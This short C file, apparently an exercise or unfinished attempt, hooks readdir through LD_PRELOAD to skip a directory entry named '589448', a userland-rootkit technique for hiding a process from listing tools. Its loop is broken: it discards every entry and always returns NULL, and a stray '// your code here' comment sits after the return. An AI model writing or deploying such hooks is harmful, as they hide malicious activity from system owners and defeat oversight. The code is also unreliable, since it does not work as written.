#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>

typedef struct dirent *(*orig_readdir_t)(DIR *dirp);
static orig_readdir_t orig_readdir;

struct dirent *readdir(DIR *dirp) {
    if(!orig_readdir) orig_readdir = (orig_readdir_t)dlsym(RTLD_NEXT, "readdir");
    struct dirent *dir;

    while((dir = orig_readdir(dirp)) && dir != NULL){
        if(strcmp(dir->d_name, "589448") == 0) continue;
    }
    return dir;
    // your code here
}

